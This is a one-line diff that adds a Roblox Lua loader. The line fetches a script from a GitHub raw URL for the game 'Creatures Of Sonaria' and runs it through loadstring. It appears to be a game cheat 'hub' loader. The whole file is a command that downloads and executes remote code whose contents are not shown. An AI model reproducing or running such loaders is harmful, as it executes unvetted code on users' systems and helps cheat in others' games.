@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Lamparddd/HUB/refs/heads/main/Creatures%20Of%20Sonaria'))()
